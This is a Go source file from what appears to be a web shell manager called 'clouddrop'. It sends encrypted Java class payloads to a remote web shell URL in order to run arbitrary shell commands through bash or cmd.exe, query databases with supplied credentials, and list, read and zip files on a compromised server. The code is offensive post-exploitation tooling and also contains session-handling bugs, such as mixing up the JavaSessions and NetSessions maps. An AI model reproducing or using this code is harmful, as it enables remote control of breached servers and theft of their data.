package service

import (
	"clouddrop/pkg/util"
	"fmt"
	"log"
	"os"
	"strings"
)

var JavaSessions map[int]string

func (s *JavaShell) GetShellType() string {
	return "java"
}

func (s *JavaShell) FreshSession(id int, url string, password string) (string, error) {
	if JavaSessions == nil {
		NetSessions = make(map[int]string)
	}
	code, err := os.ReadFile("./pkg/api/java/Check.class")
	if err != nil {
		return "", err
	}
	encode := util.Encrypt(string(code), password)
	NetSessions[id], err = util.PostRequestWithoutSession(url, password, encode)
	if err != nil {
		return "", err
	}
	session := JavaSessions[id]
	log.Println("当前JSESSIONID " + session)

	enResult, err := util.PostRequest(url, password, encode, session)
	if err != nil {
		return "", err
	}
	res := util.Decrypt(enResult, password)
	return res, nil

}

// BaseInfo
func (s *JavaShell) BaseInfo(id int, url string, password string) (string, error) {
	code, err := os.ReadFile("./pkg/api/java/BaseInfo.class")
	if err != nil {
		return "", nil
	}
	result, err := util.PostRequest(url, password, string(code), JavaSessions[id])
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(result), nil
}

func (s *JavaShell) ExecCommand(id int, command string, url string, password string) (string, error) {
	code, err := os.ReadFile("./pkg/api/java/OS.class")
	if err != nil {
		return "", nil
	}
	osType, err := util.HookPost(url, password, string(code), JavaSessions[id])
	if err != nil {
		return "", nil
	}
	var cmdPath string // in if-block-level scope, it must define at out
	if osType == "Linux" {
		cmdPath = "/bin/bash"
	} else {
		cmdPath = "C:/Windows/System32/cmd.exe"
	}

	code, _ = os.ReadFile("./pkg/api/java/CMD.class")
	code = fmt.Appendf(code, "_____cmdPath-%s,exit-true,cmd-%s", cmdPath, command)
	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}

func (s *JavaShell) ExecCode(id int, code string, url string, password string) (string, error) {
	return "", nil
}

func (s *JavaShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, url, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/java/DataBase.class")

	if database == "" {
		code = fmt.Appendf(code, "_____driver-%s,host-%s,port-%s,user-%s,pass-%s,encoding-%s",
			driver, host, port, user, pass, encoding)
	} else {
		code = fmt.Appendf(code, "_____driver-%s,host-%s,port-%s,user-%s,pass-%s,database-%s,sql-%s,option-%s,encoding-%s",
			driver, host, port, user, pass, database, sql, option, encoding)
	}

	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}

func (s *JavaShell) FileZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/java/FileZip.class")
	code = fmt.Appendf(code, "_____srcPath-%s,toPath-%s", srcPath, toPath)
	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}

func (s *JavaShell) FileUnZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/java/FileUnZip.class")
	code = fmt.Appendf(code, "_____srcPath-%s,toPath-%s", srcPath, toPath)
	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}

// FileList lists all files in the current directory
func (s *JavaShell) FileList(id int, path string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/java/FileList.class")
	code = fmt.Appendf(code, "_____path-%s", path)
	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}

func (s *JavaShell) FileShow(id int, path string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/java/FileShow.class")
	code = fmt.Appendf(code, "_____path-%s", path)
	res, err := util.HookPost(url, password, string(code), password)
	if err != nil {
		return "", nil
	}
	return res, nil
}
